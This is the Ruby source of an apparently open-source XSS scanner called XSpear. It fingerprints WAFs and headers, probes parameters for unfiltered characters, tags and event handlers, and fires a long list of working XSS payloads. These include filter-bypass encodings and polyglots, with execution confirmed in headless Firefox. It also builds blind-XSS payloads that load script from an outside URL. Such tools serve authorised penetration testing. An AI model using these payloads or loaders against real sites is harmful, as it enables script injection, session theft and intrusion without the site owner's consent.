require "XSpear/version"
require "XSpear/banner"
require "XSpear/log"
require "XSpear/XSpearRepoter"
require 'net/http'
require 'uri'
require 'optparse'
require 'colorize'
require "selenium-webdriver"
require "progress_bar"

module XSpear
  class Error < StandardError; end
end

class XspearScan
  def initialize(url, options)
    @url = url
    @data = options['data']
    @headers = options['headers']
    if options['params'].nil?
      @params = options['params']
    else
      @params = options['params'].split(",")
    end
    if options['cp'].nil?
      @custom_payload = nil
    else
      @custom_payload = File.open(options['cp'])
    end
    if options['all'] == true
      @all = true
    else
      @all = false
    end
    if options['nx'] == true
      @nx = true
    else
      @nx = false
    end
    @thread = options['thread']
    @output = options['output']
    @verbose = options['verbose']
    @blind_url = options['blind']
    @report = XspearRepoter.new @url, Time.now, (@data.nil? ? "GET" : "POST")
    @filtered_objects = {}
    @reflected_params = []
    @param_check_switch = 0
    @progress_bar = nil
  end

  class ScanCallbackFunc
    def initialize(url, method, query, response, report)
      @url = url
      @method = method
      @query = query
      @response = response
      @report = report
      # self.run
    end

    def run
      # Override callback function..

      # return type: Array(state, message)
      # + state: i(INFO), v(VULN), s(SYSTEM)
      # + message: your message

      # e.g
      # return "v", "reflected xss with #{query}"
    end
  end

  class CallbackStringMatch < ScanCallbackFunc
    def run
      if @response.body.include? @query
        [true, "reflected #{@query}"]
      else
        [false, "not reflected #{@query}"]
      end
    end
  end

  class CallbackNotAdded < ScanCallbackFunc
    def run
      if @response.body.include? @query
        if (@verbose.to_i > 1)
          time = Time.now
          puts '[I]'.blue + " [#{time.strftime('%H:%M:%S')}] [#{@response.code}/#{@response.message}] reflected #{@query}"
        end
        [false, true]
      else
        [false, "Not reflected #{@query}"]
      end
    end
  end

  class CallbackCheckWAF < ScanCallbackFunc
    def run
      pattern = {}
      pattern['AWS'] = 'AWS Web Application FW'
      pattern['ACE XML Gateway'] = 'Cisco ACE XML Gateway'
      pattern['cloudflare'] = 'CloudFlare'
      pattern['cf-ray'] = 'CloudFlare'
      pattern['Error from cloudfront'] = 'Amazone CloudFront'
      pattern['Protected by COMODO WAF'] = 'Comodo Web Application FW'
      pattern['X-Backside-Transport.*?(OK|FAIL)'] = 'IBM WebSphere DataPower'
      pattern['FORTIWAFSID'] = 'FortiWeb Web Application FW'
      pattern['ODSESSION'] = 'Hyperguard Web Application FW'
      pattern['AkamaiGHost'] = 'KONA(AKAMAIGHOST)'
      pattern['Mod_Security|NOYB'] = 'ModSecurity'
      pattern['naxsi/waf'] = 'NAXSI'
      pattern['NCI__SessionId='] = 'NetContinuum Web Application FW'
      pattern['citrix_ns_id'] = 'Citrix NetScaler'
      pattern['NSC_'] = 'Citrix NetScaler'
      pattern['NS-CACHE'] = 'Citrix NetScaler'
      pattern['newdefend'] = 'Newdefend Web Application FW'
      pattern['NSFocus'] = 'NSFOCUS Web Application FW'
      pattern['PLBSID'] = 'Profense Web Application Firewall'
      pattern['X-SL-CompState'] = 'AppWall (Radware)'
      pattern['safedog'] = 'Safedog Web Application FW'
      pattern['Sucuri/Cloudproxy|X-Sucuri'] = 'CloudProxy WebSite FW'
      pattern['X-Sucuri'] = 'CloudProxy WebSite FW'
      pattern['st8(id)'] = 'Teros/Citrix Application FW'
      pattern['st8(_wat)'] = 'Teros/Citrix Application FW'
      pattern['st8(_wlf)'] = 'Teros/Citrix Application FW'
      pattern['F5-TrafficShield'] = 'TrafficShield'
      pattern['Rejected-By-UrlScan'] = 'MS UrlScan'
      pattern['Secure Entry Server'] = 'USP Secure Entry Server'
      pattern['nginx-wallarm'] = 'Wallarm Web Application FW'
      pattern['WatchGuard'] = 'WatchGuard '
      pattern['X-Powered-By-360wzb'] = '360 Web Application'
      pattern['WebKnight'] = 'WebKnight Application FW'

      pattern.each do |key,value|
        if !@response[key].nil?
          time = Time.now
          puts '[I]'.blue + " [#{time.strftime('%H:%M:%S')}] Found WAF: #{value}"
          @report.add_issue("i","d","-","-","<original query>","Found WAF: #{value}")
        end
      end

      [false, "not reflected #{@query}"]
    end
  end


  class CallbackCheckHeaders < ScanCallbackFunc
    def run
      if !@response['Server'].nil?
        # Server header
        @report.add_issue("i","s","-","-","<original query>","Found Server: #{@response['Server']}")
      end

      if @response['Strict-Transport-Security'].nil?
        # HSTS
        @report.add_issue("i","s","-","-","<original query>","Not set HSTS")
      end


      if !@response['Content-Type'].nil?
        @report.add_issue("i","s","-","-","<original query>","Content-Type: #{@response['Content-Type']}")
      end


      if !@response['X-XSS-Protection'].nil?
        @report.add_issue("i","s","-","-","<original query>","Not set X-XSS-Protection")
      end


      if !@response['X-Frame-Options'].nil?
        @report.add_issue("i","s","-","-","<original query>","X-Frame-Options: #{@response['X-Frame-Options']}")
      else
        @report.add_issue("l","s","-","-","<original query>","Not Set X-Frame-Options")
      end


      if !@response['Content-Security-Policy'].nil?
        begin
          csp = @response['Content-Security-Policy']
          csp = csp.split(';')
          r = " "
          csp.each do |c|
            d = c.split " "
            r = r+d[0]+" "
          end
          @report.add_issue("i","s","-","-","<original query>","Enabled CSP")
        rescue
          @report.add_issue("i","s","-","-","<original query>","CSP ERROR")
        end
      else
        @report.add_issue("m","s","-","-","<original query>","Not Set CSP")
      end

      [false, "not reflected #{@query}"]
    end
  end

  class CallbackErrorPatternMatch < ScanCallbackFunc
    def run
      info = "Found"
      if @response.body.to_s.match(/(SQL syntax.*MySQL|Warning.*mysql_.*|MySqlException \(0x|valid MySQL result|check the manual that corresponds to your (MySQL|MariaDB) server version|MySqlClient\.|com\.mysql\.jdbc\.exceptions)/i)
        info = info + "MYSQL Error"
      end
      if @response.body.to_s.match(/(Driver.* SQL[\-\_\ ]*Server|OLE DB.* SQL Server|\bSQL Server.*Driver|Warning.*mssql_.*|\bSQL Server.*[0-9a-fA-F]{8}|[\s\S]Exception.*\WSystem\.Data\.SqlClient\.|[\s\S]Exception.*\WRoadhouse\.Cms\.|Microsoft SQL Native Client.*[0-9a-fA-F]{8})/i)
        info = info + "MSSQL Error"
      end
      if @response.body.to_s.match(/(\bORA-\d{5}|Oracle error|Oracle.*Driver|Warning.*\Woci_.*|Warning.*\Wora_.*)/i)
        info = info + "Oracle Error"
      end
      if @response.body.to_s.match(/(PostgreSQL.*ERROR|Warning.*\Wpg_.*|valid PostgreSQL result|Npgsql\.|PG::SyntaxError:|org\.postgresql\.util\.PSQLException|ERROR:\s\ssyntax error at or near)/i)
        info = info + "Postgres Error"
      end
      if @response.body.to_s.match(/(Microsoft Access (\d+ )?Driver|JET Database Engine|Access Database Engine|ODBC Microsoft Access)/i)
        info = info + "MSAccess Error"
      end
      if @response.body.to_s.match(/(SQLite\/JDBCDriver|SQLite.Exception|System.Data.SQLite.SQLiteException|Warning.*sqlite_.*|Warning.*SQLite3::|\[SQLITE_ERROR\])/i)
        info = info + "SQLite Error"
      end
      if @response.body.to_s.match(/(Warning.*sybase.*|Sybase message|Sybase.*Server message.*|SybSQLException|com\.sybase\.jdbc)/i)
        info = info + "SyBase Error"
      end
      if @response.body.to_s.match(/(Warning.*ingres_|Ingres SQLSTATE|Ingres\W.*Driver)/i)
        info = info + "Ingress Error"
      end

      if info.length > 5
        [true, "#{@info}"]
      else
        [false, "#{@info}"]
      end
    end
  end

  class CallbackXSSSelenium < ScanCallbackFunc
    def run
      begin
      options = Selenium::WebDriver::Firefox::Options.new(args: ['-headless'])
      driver = Selenium::WebDriver.for(:firefox, options: options)
      if @method == "GET"
        begin
          driver.get(@url+"?"+@query)
          alert = driver.switch_to().alert()
          if alert.text.to_s == "45"
            driver.quit
            return [true, "found alert/prompt/confirm (45) in selenium!! #{@query}"]
          else
            driver.quit
            return [true, "found alert/prompt/confirm event in selenium #{@query}"]
          end
        rescue Selenium::WebDriver::Error::UnexpectedAlertOpenError => e
          driver.quit
          return [true, "found alert/prompt/confirm error base in selenium #{@query}"]
        rescue => e
          driver.quit
          return [false, "not found alert/prompt/confirm event #{@query}"]
        end
      end
    rescue => e
      log('s', "Error Selenium : #{e}")
    end
    end
  end

  def run
    r = []
    event_handler = [
        'onabort',
        'onactivate',
        'onafterprint',
        'onafterscriptexecute',
        'onafterupdate',
        'onanimationcancel',
        'onanimationstart',
        'onauxclick',
        'onbeforeactivate',
        'onbeforecopy',
        'onbeforecut',
        'onbeforedeactivate',
        'onbeforeeditfocus',
        'onbeforepaste',
        'onbeforeprint',
        'onbeforescriptexecute',
        'onbeforeunload',
        'onbeforeupdate',
        'onbegin',
        'onblur',
        'onbounce',
        'oncanplay',
        'oncanplaythrough',
        'oncellchange',
        'onchange',
        'onclick',
        'oncontextmenu',
        'oncontrolselect',
        'oncopy',
        'oncut',
        'ondataavailable',
        'ondatasetchanged',
        'ondatasetcomplete',
        'ondblclick',
        'ondeactivate',
        'ondrag',
        'ondragdrop',
        'ondragend',
        'ondragenter',
        'ondragleave',
        'ondragover',
        'ondragstart',
        'ondrop',
        'onend',
        'onerror',
        'onerrorupdate',
        'onfilterchange',
        'onfinish',
        'onfocus',
        'onfocusin',
        'onfocusout',
        'onhashchange',
        'onhelp',
        'oninput',
        'oninvalid',
        'onkeydown',
        'onkeypress',
        'onkeyup',
        'onlayoutcomplete',
        'onload',
        'onloadend',
        'onloadstart',
        'onloadstart',
        'onlosecapture',
        'onmediacomplete',
        'onmediaerror',
        'onmessage',
        'onmousedown',
        'onmouseenter',
        'onmouseleave',
        'onmousemove',
        'onmouseout',
        'onmouseover',
        'onmouseup',
        'onmousewheel',
        'onmove',
        'onmoveend',
        'onmovestart',
        'onoffline',
        'ononline',
        'onoutofsync',
        'onpageshow',
        'onpaste',
        'onpause',
        'onplay',
        'onplaying',
        'onpointerdown',
        'onpointerenter',
        'onpointerleave',
        'onpointermove',
        'onpointerout',
        'onpointerover',
        'onpointerup',
        'onpopstate',
        'onprogress',
        'onpropertychange',
        'onreadystatechange',
        'onredo',
        'onrepeat',
        'onreset',
        'onresize',
        'onresizeend',
        'onresizestart',
        'onresume',
        'onreverse',
        'onrowdelete',
        'onrowexit',
        'onrowinserted',
        'onrowsenter',
        'onscroll',
        'onsearch',
        'onseek',
        'onselect',
        'onselectionchange',
        'onselectstart',
        'onstart',
        'onstop',
        'onstorage',
        'onsubmit',
        'onsyncrestored',
        'ontimeerror',
        'ontimeupdate',
        'ontoggle',
        'ontouchend',
        'ontouchmove',
        'ontouchstart',
        'ontrackchange',
        'ontransitioncancel',
        'ontransitionend',
        'ontransitionrun',
        'onundo',
        'onunhandledrejection',
        'onunload',
        'onurlflip',
        'onvolumechange',
        'onwaiting',
        'onwheel',
        'whatthe=""onload',
        'onpointerrawupdate'
    ]
    tags = [
        "script",
        "iframe",
        "svg",
        "img",
        "video",
        "audio",
        "meta",
        "object",
        "embed",
        "style",
        "frame",
        "frameset",
        "applet"
    ]
    special_chars =[
        ">",
        "<",
        '"',
        "'",
        "`",
        ";",
        "|",
        "(",
        ")",
        "{",
        "}",
        "[",
        "]",
        ":",
        ".",
        ",",
        "+",
        "-",
        "=",
        "$"
    ]
    useful_code = [
        "javascript:",
        "JaVasCriPt:",
        "jaVas%0dcRipt:",
        "jaVas%0acRipt:",
        "jaVas%09cRipt:",
        "data:",
        "alert(",
        "alert`",
        "prompt(",
        "prompt`",
        "confirm(",
        "confirm`",
        "document.location",
        "document.cookie",
        "window.location"
    ]


    ## [ Parameter Analysis ]
    log('s', 'analysis request..')
    r.push makeQueryPattern('x', '<script>alert(45)</script>', '<script>alert(45)</script>', 'i', "Found WAF", CallbackCheckWAF)
    r.push makeQueryPattern('s', '', '', 'i', "-", CallbackCheckHeaders)
    r.push makeQueryPattern('d', 'XsPeaR"', 'XsPeaR"', 'i', "Found SQL Error Pattern", CallbackErrorPatternMatch)
    r.push makeQueryPattern('r', 'rEfe6', 'rEfe6', 'i', 'reflected parameter', CallbackStringMatch)
    r = r.flatten
    r = r.flatten


    threads = []
    r.each_slice(@thread) do |jobs|
      jobs.map do |node|
        Thread.new do
          begin
            result, req, res = task(node[:query], node[:inject], node[:pattern], node[:callback])
            # p result.body
            if @verbose.to_i > 2
              log('d', "[#{res.code}/#{res.message}] #{node[:query]} in #{node[:inject]}\n[ Request ]\n#{req.to_hash.inspect}\n[ Response ]\n#{res.to_hash.inspect}")
            end
            if result[0]
              log(node[:category], "[#{res.code}/#{res.message}] "+(result[1]).to_s.yellow+"[param: #{node[:param]}][#{node[:desc]}]")
              @report.add_issue(node[:category],node[:type],node[:param],node[:query],node[:pattern],node[:desc])
              @reflected_params.push node[:param]
            elsif (node[:callback] == CallbackNotAdded) && (result[1].to_s == "true")
              @filtered_objects[node[:param].to_s].nil? ? (@filtered_objects[node[:param].to_s] = [node[:pattern].to_s]) : (@filtered_objects[node[:param].to_s].push(node[:pattern].to_s))
            elsif node[:type] != "d"
              log('d', "[#{res.code}/#{res.message}] '#{node[:param]}' "+(result[1]).to_s)
            end
          rescue => e
          end
        end
      end.each(&:join)
    end

    if @all == true
      log('s',"used test-all-params mode(-a)")
      if @blind_url.nil?
        log('s',"creating a test query all param")
      else
        log('s',"creating a test query all param + blind XSS")
      end
    else
      log('s',"used test-reflected-params mode(default)")
      if @blind_url.nil?
        log('s',"creating a test query [for reflected #{@reflected_params.length} param ]")
      else
        log('s',"creating a test query [for reflected #{@reflected_params.length} param + blind XSS ]")
      end
    end
    @param_check_switch = false
    ## [ XSS Scanning ]
    r = []
    # Check Special Char
    special_chars.each do |sc|
      r.push makeQueryPattern('f', "#{sc}XsPeaR", "#{sc}XsPeaR", 'i', "not filtered "+"#{sc}".blue, CallbackNotAdded)
    end


    # Check Event Handler
    r.push makeQueryPattern('f', '\"><xspear onhwul=64>', 'onhwul=64', 'i', "reflected EH "+"on{any} pattern".blue, CallbackStringMatch)
    event_handler.each do |ev|
      r.push makeQueryPattern('f', "\"<xspear #{ev}=64>", "#{ev}=64", 'i', "reflected EH "+"#{ev}=64".blue, CallbackNotAdded)
    end


    # Check HTML Tag
    tags.each do |tag|
      r.push makeQueryPattern('f', "\">xsp<#{tag}>", "xsp<#{tag}>", 'i', "not filtered "+"<#{tag}>".blue, CallbackNotAdded)
    end


    # Check useful code
    useful_code.each do |c|
      r.push makeQueryPattern('f', "#{c}.xspear", "#{c}.xspear", 'i', "not filtered "+"'#{c}' code".blue, CallbackNotAdded)
    end


    if @nx != true
      # Check Common XSS Payloads
      onfocus_tags = [
          "input",
          "select",
          "textarea",
          "keygen"
      ]
      r.push makeQueryPattern('x', '"><script>alert(45)</script>', '<script>alert(45)</script>', 'h', "reflected "+"XSS Code".red, CallbackStringMatch)
      r.push makeQueryPattern('x', '<svg/onload=alert(45)>', '<svg/onload=alert(45)>', 'h', "reflected "+"XSS Code".red, CallbackStringMatch)
      r.push makeQueryPattern('x', '<img/src onerror=alert(45)>', '<img/src onerror=alert(45)>', 'h', "reflected "+"XSS Code".red, CallbackStringMatch)
      r.push makeQueryPattern('x', '"><scr<script>ipt>alert(45)</scr<script>ipt>', '<script>alert(45)</script>', 'h', "reflected "+"XSS Code".red, CallbackStringMatch)
      r.push makeQueryPattern('x', '"><iframe/src=JavaScriPt:alert(45)>', '"><iframe/src=JavaScriPt:alert(45)>', 'h', "reflected "+"XSS Code".red, CallbackStringMatch)
      r.push makeQueryPattern('x', '"\'><video/poster/onerror=alert(45)>', '<video/poster/onerror=alert(45)>', 'h', "reflected "+"HTML5 XSS Code".red, CallbackStringMatch)
      r.push makeQueryPattern('x', '"\'><details/open/ontoggle="alert`45`">', '<details/open/ontoggle="alert`45`">', 'h', "reflected "+"HTML5 XSS Code".red, CallbackStringMatch)
      r.push makeQueryPattern('x', '"\'><audio src onloadstart=alert(45)>', '<audio src onloadstart=alert(45)>', 'h', "reflected "+"HTML5 XSS Code".red, CallbackStringMatch)
      r.push makeQueryPattern('x', '"\'><marquee onstart=alert(45)>', '<marquee onstart=alert(45)>', 'h', "reflected "+"HTML5 XSS Code".red, CallbackStringMatch)
      r.push makeQueryPattern('x', '"\'><meter onmouseover=alert(45)>0</meter>', '<meter onmouseover=alert(45)>0</meter>', 'h', "reflected "+"HTML5 XSS Code".red, CallbackStringMatch)
      r.push makeQueryPattern('x', '"\'><svg><animate xlink:href=#xss attributeName=href dur=5s repeatCount=indefinite keytimes=0;0;1 values="https://portswigger.net?&semi;javascript:alert(1)&semi;0" /><a id=xss><text x=20 y=20>XSS</text></a>', '<svg><animate xlink:href=#xss attributeName=href dur=5s repeatCount=indefinite keytimes=0;0;1 values="https://portswigger.net?&semi;javascript:alert(1)&semi;0" />', 'h', "reflected "+"SVG Animate XSS".red, CallbackStringMatch)
      r.push makeQueryPattern('x', '"\'><a href="jav    ascript:alert(45)">XSS</a>', '<a href="jav    ascript:alert(45)"">XSS</a>', 'h', "reflected "+"XSS Code".red, CallbackStringMatch)
      r.push makeQueryPattern('x', '"\'><a href="javascript&colon;alert(45)">XSS</a>', '<a href="javascript&colon;alert(45)">XSS</a>', 'h', "reflected "+"XSS Code".red, CallbackStringMatch)
      r.push makeQueryPattern('x', '"\'><a href="javascript&#0058;alert(45)">XSS</a>', '<a href="javascript&#0058;alert(45)">XSS</a>', 'h', "reflected "+"XSS Code".red, CallbackStringMatch)
      r.push makeQueryPattern('x', '"\'><a href="javascript&#0000058alert(45)">XSS</a>', '<a href="javascript&#0000058alert(45)">XSS</a>', 'h', "reflected "+"XSS Code".red, CallbackStringMatch)
      r.push makeQueryPattern('x', '"\'><a href="&#14; javascript:alert(45)">XSS</a>', '<a href="&#14; javascript:alert(45)">XSS</a>', 'h', "reflected "+"XSS Code".red, CallbackStringMatch)
      r.push makeQueryPattern('x', '"\'><a href="javascript&#x003a;alert(45)">XSS</a>', '<a href="javascript&#x003a;alert(45)">XSS</a>', 'h', "reflected "+"XSS Code".red, CallbackStringMatch)
      r.push makeQueryPattern('x', '"\'><a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29">XSS</a>', '<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29">XSS</a>', 'h', "reflected "+"XSS Code".red, CallbackStringMatch)

      onfocus_tags.each do |t|
        r.push makeQueryPattern('x', "\"'><#{t} autofocus onfocus=alert(45)>", "<#{t} autofocus onfocus=alert(45)>", 'h', "reflected "+"onfocus XSS Code".red, CallbackStringMatch)
      end

      # Check Selenium Common XSS Payloads
      r.push makeQueryPattern('x', '"><script>alert(45)</script>', '<script>alert(45)</script>', 'v', "triggered ".yellow+"<script>alert(45)</script>".red, CallbackXSSSelenium)
      r.push makeQueryPattern('x', '"><svgonload=alert(45)>', '<svg(0x0c)onload=alert(1)>', 'v', "triggered ".yellow+"<svg(0x0c)onload=alert(1)>".red, CallbackXSSSelenium)
      r.push makeQueryPattern('x', '<xmp><p title="</xmp><svg/onload=alert(45)>">', '<xmp><p title="</xmp><svg/onload=alert(45)>">', 'v', "triggered ".yellow+"<xmp><p title='</xmp><svg/onload=alert(45)>'>".red, CallbackXSSSelenium)
      r.push makeQueryPattern('x', '\'"><svg/onload=alert(45)>', '\'"><svg/onload=alert(45)>', 'v', "triggered ".yellow+"<svg/onload=alert(45)>".red, CallbackXSSSelenium)
      r.push makeQueryPattern('x', '"\'><video/poster/onerror=alert(45)>', '<video/poster/onerror=alert(45)>', 'v', "triggered ".yellow+"<video/poster/onerror=alert(45)>".red, CallbackXSSSelenium)
      r.push makeQueryPattern('x', '"\'><details/open/ontoggle="alert(45)">', '<details/open/ontoggle="alert(45)">', 'v', "triggered ".yellow+"<details/open/ontoggle=\"alert(45)\">".red, CallbackXSSSelenium)
      r.push makeQueryPattern('x', '"\'><audio src onloadstart=alert(45)>', '<audio src onloadstart=alert(45)>', 'v', "triggered ".yellow+"<audio src onloadstart=alert(45)>".red, CallbackXSSSelenium)
      r.push makeQueryPattern('x', '"\'><marquee onstart=alert(45)>', '<marquee onstart=alert(45)>', 'v', "triggered ".yellow+"<marquee onstart=alert(45)>".red, CallbackXSSSelenium)
      r.push makeQueryPattern('x', '"\'><svg/whatthe=""onload=alert(45)>', '<svg/whatthe=""onload=alert(45)>', 'v', "triggered ".yellow+"<svg/whatthe=""onload=alert(45)>".red, CallbackXSSSelenium)
      # + in Javascript payloads
      r.push makeQueryPattern('x', '\'+alert(45)+\'', 'alert(45)', 'v', "triggered ".yellow+"in JS".red, CallbackXSSSelenium)
      r.push makeQueryPattern('x', '"+alert(45)+"', 'alert(45)', 'v', "triggered ".yellow+"in JS".red, CallbackXSSSelenium)
      r.push makeQueryPattern('x', '\'%2Balert(45)%2B\'', 'alert(45)', 'v', "triggered ".yellow+"in JS".red, CallbackXSSSelenium)
      r.push makeQueryPattern('x', '"%2Balert(45)%2B"', 'alert(45)', 'v', "triggered ".yellow+"in JS".red, CallbackXSSSelenium)

      # Check Selenium XSS Polyglot
      r.push makeQueryPattern('x', 'jaVasCript:/*-/*`/*\`/*\'/*"/**/(/* */oNcliCk=alert(45) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(45)//>\x3e', '\'"><svg/onload=alert(45)>', 'v', "triggered ".yellow+"XSS Polyglot payload".red, CallbackXSSSelenium)
      r.push makeQueryPattern('x', 'javascript:"/*`/*\"/*\' /*</stYle/</titLe/</teXtarEa/</nOscript></Script></noembed></select></template><FRAME/onload=/**/alert(45)//-->&lt;<sVg/onload=alert`45`>', '\'"><svg/onload=alert(45)>', 'v', "triggered ".yellow+"XSS Polyglot payload".red, CallbackXSSSelenium)
      r.push makeQueryPattern('x', 'javascript:"/*\'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert(45)//>', '\'"><svg/onload=alert(45)>', 'v', "triggered ".yellow+"XSS Polyglot payload".red, CallbackXSSSelenium)

    end
    # Check Blind XSS Payload
    if !@blind_url.nil?
      r.push makeQueryPattern('f', "\"'><script src=#{@blind_url}></script>", "BLINDNOTDETECTED", 'i', "", CallbackNotAdded)
      r.push makeQueryPattern('f', "\"'><script>$.getScript('#{@blind_url}')</script>", "BLINDNOTDETECTED", 'i', "", CallbackNotAdded)
      r.push makeQueryPattern('f', "\"'><svg onload=javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'#{@blind_url}\';d.body.appendChild(_)')>", "BLINDNOTDETECTED", 'i', "", CallbackNotAdded)
      r.push makeQueryPattern('f', "\"'><iframe src=javascript:$.getScript('#{@blind_url}')></iframe>", "BLINDNOTDETECTED", 'i', "", CallbackNotAdded)
    end

    if !@custom_payload.nil?
      log('s','load custom payload')
      cps = JSON.parse @custom_payload.read
      cps.each do |cp|
        if cp['callback'] == 'P1'
          r.push makeQueryPattern('x', cp['payload'], cp['payload'], 'h', "reflected "+"Custom Payload #{cp['descript']} ".red, CallbackStringMatch)
        elsif cp['callback'] == 'P2'
          r.push makeQueryPattern('x', cp['payload'], 'alert(45)', 'v', "triggered ".yellow+"Custom Payload #{cp['descript']}".red, CallbackXSSSelenium)
        else

        end
      end
      log('s',"loaded and creating #{cps.length} custom payloads")
    end

    r = r.flatten
    r = r.flatten
    log('s', "test query generation is complete. [#{r.length} query]")
    log('s', "starting XSS Scanning. [#{@thread} threads]")
    if @verbose.to_i == 1
      @progress_bar = ProgressBar.new(r.length)
    end


    r.each_slice(@thread) do |jobs|
      jobs.map do |node|
        Thread.new do
          begin
            result, req, res = task(node[:query], node[:inject], node[:pattern], node[:callback])
            # p result.body
            if @verbose.to_i > 2
              log('d', "[#{res.code}/#{res.message}] #{node[:query]} in #{node[:inject]}\n[ Request ]\n#{req.to_hash.inspect}\n[ Response ]\n#{res.to_hash.inspect}")
            end
            if result[0]
              log(node[:category], "[#{res.code}/#{res.message}] "+(result[1]).to_s.yellow+"[param: #{node[:param]}][#{node[:desc]}]")
              @report.add_issue(node[:category],node[:type],node[:param],node[:query],node[:pattern],node[:desc])
            elsif (node[:callback] == CallbackNotAdded) && (result[1].to_s == "true")
              @filtered_objects[node[:param].to_s].nil? ? (@filtered_objects[node[:param].to_s] = [node[:pattern].to_s]) : (@filtered_objects[node[:param].to_s].push(node[:pattern].to_s))
            elsif node[:type] != "f"
              log('d', "[#{res.code}/#{res.message}] '#{node[:param]}' "+(result[1]).to_s)
            end
          rescue => e
          end
        end
      end.each(&:join)
    end

    @report.set_filtered @filtered_objects
    @report.set_endtime
    log('s', "finish scan. the report is being generated..")
    if @output == 'json'
      puts @report.to_json
    elsif @output == 'html'
      f = File.open 'report.html', 'w+'
      f.write @report.to_html
      log('s', "generate html report file. please open ./report.html file")
    else
      @report.to_cli
    end
  end

  def reporter
    @report
  end

  def makeQueryPattern(type, payload, pattern, category, desc, callback)
    # type: [r]eflected param
    #       [f]ilted rule
    #       [x]ss
    #       [s]tatic
    #       [d]ynamic
    result = []
    if type == 's'
      if @data.nil?
        result.push("inject": 'url',"param":"STATIC" ,"type": type, "query": @url, "pattern": pattern, "desc": desc, "category": category, "callback": callback)
      else
        result.push("inject": 'body',"param":"STATIC" ,"type": type, "query": @url, "pattern": pattern, "desc": desc, "category": category, "callback": callback)
      end
    else
      uri = URI.parse(@url)
      begin
        if @data.nil?
          params = URI.decode_www_form(uri.query)
          params.each do |p|
            if  (@param_check_switch) || (@reflected_params.include? p[0]) || pattern == "BLINDNOTDETECTED" || @all
              if @params.nil? || (@params.include? p[0] if !@params.nil?)
                attack = ""
                dparams = params
                dparams.each do |d|
                  attack = uri.query.sub "#{d[0]}=#{d[1]}","#{d[0]}=#{d[1]}#{URI.encode_www_form_component(payload)}" if p[0] == d[0]
                  #d[1] = p[1] + payload if p[0] == d[0]
                end
                result.push("inject": 'url',"param":p[0] ,"type": type, "query": attack, "pattern": pattern, "desc": desc, "category": category, "callback": callback)
              end
            end
          end
        else
          params = URI.decode_www_form(@data)
          params.each do |p|
            if (@param_check_switch) || (@reflected_params.include? p[0]) || pattern == "BLINDNOTDETECTED" || @all
              if @params.nil? || (@params.include? p[0] if !@params.nil?)
                attack = ""
                dparams = params
                dparams.each do |d|
                  attack = @data.sub "#{d[0]}=#{d[1]}","#{d[0]}=#{d[1]}#{URI.encode_www_form_component(payload)}" if p[0] == d[0]
                  # #45 Issue, URI::encode to URI.encode_www_form_component
                  #d[1] = p[1] + payload if p[0] == d[0]
                end
                result.push("inject": 'body', "param":p[0], "type": type, "query": attack, "pattern": pattern, "desc": desc, "category": category, "callback": callback)
              end
            end
          end
        end
        if callback == CallbackXSSSelenium
          begin
            puri = URI.parse(@url)
            puri.path = puri.path+URI.encode_www_form_component("/"+pattern)
            result.push("inject": 'url',"param":"STATIC" ,"type": type, "query": puri.to_s, "pattern": "[PATH]", "desc": "[Path]"+desc, "category": category, "callback": callback)
            puri = URI.parse(@url)
            puri.path = puri.path+URI.encode_www_form_component(pattern)
            result.push("inject": 'url',"param":"STATIC" ,"type": type, "query": puri.to_s, "pattern": "[PATH]", "desc": "[Path]"+desc, "category": category, "callback": callback)
          rescue
            # bypass
            # if no slash end
          end
        end
      rescue StandardError
        # bypass
        # if no params

        if callback == CallbackXSSSelenium
          begin
            puri = URI.parse(@url)
            puri.path = puri.path+URI.encode_www_form_component("/"+pattern)
            result.push("inject": 'url',"param":"STATIC" ,"type": type, "query": puri.to_s, "pattern": "[PATH]", "desc": "[Path]"+desc, "category": category, "callback": callback)
            puri = URI.parse(@url)
            puri.path = puri.path+URI.encode_www_form_component(pattern)
            result.push("inject": 'url',"param":"STATIC" ,"type": type, "query": puri.to_s, "pattern": "[PATH]", "desc": "[Path]"+desc, "category": category, "callback": callback)
          rescue
            # bypass
            # if no slash end
          end
        end
      end
      result
    end
  end

  def task(query, injected, pattern, callback)
    begin
      if (!@progress_bar.nil?) && @verbose.to_i == 1
        print "\r\r"
        print "\r\r"
        @progress_bar.increment!
      end
      uri = nil
      if pattern == "[PATH]"
        uri = URI.parse(query)
      else
        uri = URI.parse(@url)
      end
      request = nil
      method = "GET"
      uri.query = query if injected == 'url'


      if @data.nil?
        # GET
        request = Net::HTTP::Get.new(uri.request_uri)
      else
        # POST
        request = Net::HTTP::Post.new(uri.request_uri)
        request.body = query if injected == 'body'
        method = "POST"
      end


      Net::HTTP.start(uri.host, uri.port,
                      use_ssl: uri.scheme == 'https') do |http|

        request['Accept'] = '*/*'
        request['Connection'] = 'keep-alive'
        request['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0'
        unless @headers.nil?
          @headers.split(';').each do |header|
            begin
              c = header.split(': ')
              request[c[0]] = c[1] unless c.nil?
            rescue StandardError
              # pass
            end
          end
        end
        response = http.request(request)
        result = callback.new(uri.to_s, method, pattern, response, @report).run
        # result = result.run
        # p request.headers
        return result, request, response
      end
    end
  rescue => e
    #puts e
  end
end